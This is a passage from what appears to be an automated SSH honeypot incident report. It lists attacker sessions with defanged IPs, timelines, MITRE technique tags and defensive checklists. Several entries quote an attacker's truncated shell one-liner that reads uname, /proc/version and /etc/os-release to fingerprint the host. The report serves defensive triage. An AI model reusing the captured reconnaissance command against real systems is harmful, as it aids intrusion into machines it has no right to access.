- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82495c83927

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-22 15:01 |
| **Last Seen** | 2026-08-22 15:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:01:42` | `cowrie.session.connect` |
| `2026-08-22 15:01:43` | `cowrie.client.version` |
| `2026-08-22 15:01:43` | `cowrie.client.kex` |
| `2026-08-22 15:01:44` | `cowrie.login.success` |
| `2026-08-22 15:01:44` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634afd67166e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:02 |
| **Last Seen** | 2026-08-22 15:03 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:02:59` | `cowrie.session.connect` |
| `2026-08-22 15:03:00` | `cowrie.client.version` |
| `2026-08-22 15:03:00` | `cowrie.client.kex` |
| `2026-08-22 15:03:06` | `cowrie.login.success` |
| `2026-08-22 15:03:11` | `cowrie.session.params` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.success` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:11` | `cowrie.command.input` |
| `2026-08-22 15:03:12` | `cowrie.log.closed` |
| `2026-08-22 15:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d01c90071e1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:04 |
| **Last Seen** | 2026-08-22 15:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:04:57` | `cowrie.session.connect` |
| `2026-08-22 15:04:58` | `cowrie.client.version` |
| `2026-08-22 15:04:58` | `cowrie.client.kex` |
| `2026-08-22 15:05:04` | `cowrie.login.success` |
| `2026-08-22 15:05:10` | `cowrie.session.params` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.success` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:10` | `cowrie.command.input` |
| `2026-08-22 15:05:11` | `cowrie.log.closed` |
| `2026-08-22 15:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6dc94466b82

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:06 |
| **Last Seen** | 2026-08-22 15:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:06:47` | `cowrie.session.connect` |
| `2026-08-22 15:06:48` | `cowrie.client.version` |
| `2026-08-22 15:06:48` | `cowrie.client.kex` |
| `2026-08-22 15:06:55` | `cowrie.login.success` |
| `2026-08-22 15:06:59` | `cowrie.session.params` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.success` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:06:59` | `cowrie.command.input` |
| `2026-08-22 15:07:00` | `cowrie.log.closed` |
| `2026-08-22 15:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e3fd36850d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:08 |
| **Last Seen** | 2026-08-22 15:08 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:08:29` | `cowrie.session.connect` |
| `2026-08-22 15:08:31` | `cowrie.client.version` |
| `2026-08-22 15:08:31` | `cowrie.client.kex` |
| `2026-08-22 15:08:37` | `cowrie.login.success` |
| `2026-08-22 15:08:42` | `cowrie.session.params` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.success` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:42` | `cowrie.command.input` |
| `2026-08-22 15:08:43` | `cowrie.log.closed` |
| `2026-08-22 15:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10722fcc381

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:09 |
| **Last Seen** | 2026-08-22 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:09:29` | `cowrie.session.connect` |
| `2026-08-22 15:09:29` | `cowrie.client.version` |
| `2026-08-22 15:09:29` | `cowrie.client.kex` |
| `2026-08-22 15:09:30` | `cowrie.login.success` |
| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-127a931fee48

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:09 |
| **Last Seen** | 2026-08-22 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:09:39` | `cowrie.session.connect` |
| `2026-08-22 15:09:39` | `cowrie.client.version` |
| `2026-08-22 15:09:39` | `cowrie.client.kex` |
| `2026-08-22 15:09:40` | `cowrie.login.success` |
| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad91610138a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:10 |
| **Last Seen** | 2026-08-22 15:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:10:05` | `cowrie.session.connect` |
| `2026-08-22 15:10:06` | `cowrie.client.version` |
| `2026-08-22 15:10:06` | `cowrie.client.kex` |
| `2026-08-22 15:10:12` | `cowrie.login.success` |
| `2026-08-22 15:10:17` | `cowrie.session.params` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.success` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:17` | `cowrie.command.input` |
| `2026-08-22 15:10:18` | `cowrie.log.closed` |
| `2026-08-22 15:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f9ada80349

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-22 15:10 |
| **Last Seen** | 2026-08-22 15:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:10:20` | `cowrie.session.connect` |
| `2026-08-22 15:10:22` | `cowrie.client.version` |
| `2026-08-22 15:10:22` | `cowrie.client.kex` |
| `2026-08-22 15:10:24` | `cowrie.login.success` |
| `2026-08-22 15:10:25` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c549878ea5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:11 |
| **Last Seen** | 2026-08-22 15:12 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:11:51` | `cowrie.session.connect` |
| `2026-08-22 15:11:52` | `cowrie.client.version` |
| `2026-08-22 15:11:52` | `cowrie.client.kex` |
| `2026-08-22 15:11:59` | `cowrie.login.success` |
| `2026-08-22 15:12:04` | `cowrie.session.params` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.success` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:04` | `cowrie.command.input` |
| `2026-08-22 15:12:06` | `cowrie.log.closed` |
| `2026-08-22 15:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c3d18bb502

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-08-22 15:11 |
| **Last Seen** | 2026-08-22 15:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:11:55` | `cowrie.session.connect` |
| `2026-08-22 15:11:56` | `cowrie.client.version` |
| `2026-08-22 15:11:56` | `cowrie.client.kex` |
| `2026-08-22 15:11:59` | `cowrie.login.success` |
| `2026-08-22 15:12:00` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50543296494d

| Field | Detail |
|---|---|
| **Source IP** | `135.23.190[.]48` |
| **First Seen** | 2026-08-22 15:12 |
| **Last Seen** | 2026-08-22 15:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:12:05` | `cowrie.session.connect` |
| `2026-08-22 15:12:05` | `cowrie.client.version` |
| `2026-08-22 15:12:05` | `cowrie.client.kex` |
| `2026-08-22 15:12:06` | `cowrie.login.success` |
| `2026-08-22 15:12:07` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.23.190[.]48` to AbuseIPDB if not already reported
- [ ] Block `135.23.190[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889308134a7a

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-08-22 15:12 |
| **Last Seen** | 2026-08-22 15:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:12:12` | `cowrie.session.connect` |
| `2026-08-22 15:12:13` | `cowrie.client.version` |
| `2026-08-22 15:12:13` | `cowrie.client.kex` |
| `2026-08-22 15:12:15` | `cowrie.login.success` |
| `2026-08-22 15:12:16` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3090a7e3f763

| Field | Detail |
|---|---|
| **Source IP** | `223.82.86[.]2` |
| **First Seen** | 2026-08-22 15:12 |
| **Last Seen** | 2026-08-22 15:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:12:22` | `cowrie.session.connect` |
| `2026-08-22 15:12:22` | `cowrie.client.version` |
| `2026-08-22 15:12:22` | `cowrie.client.kex` |
| `2026-08-22 15:12:25` | `cowrie.login.success` |
| `2026-08-22 15:12:25` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9106dba560

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:13 |
| **Last Seen** | 2026-08-22 15:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:13:32` | `cowrie.session.connect` |
| `2026-08-22 15:13:33` | `cowrie.client.version` |
| `2026-08-22 15:13:33` | `cowrie.client.kex` |
| `2026-08-22 15:13:36` | `cowrie.login.success` |
| `2026-08-22 15:13:38` | `cowrie.session.params` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.success` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.command.input` |
| `2026-08-22 15:13:38` | `cowrie.log.closed` |
| `2026-08-22 15:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a97350af9a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:15 |
| **Last Seen** | 2026-08-22 15:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:15:21` | `cowrie.session.connect` |
| `2026-08-22 15:15:23` | `cowrie.client.version` |
| `2026-08-22 15:15:23` | `cowrie.client.kex` |
| `2026-08-22 15:15:28` | `cowrie.login.success` |
| `2026-08-22 15:15:31` | `cowrie.session.params` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.success` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:31` | `cowrie.command.input` |
| `2026-08-22 15:15:32` | `cowrie.log.closed` |
| `2026-08-22 15:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-509cca04062d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:16 |
| **Last Seen** | 2026-08-22 15:17 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
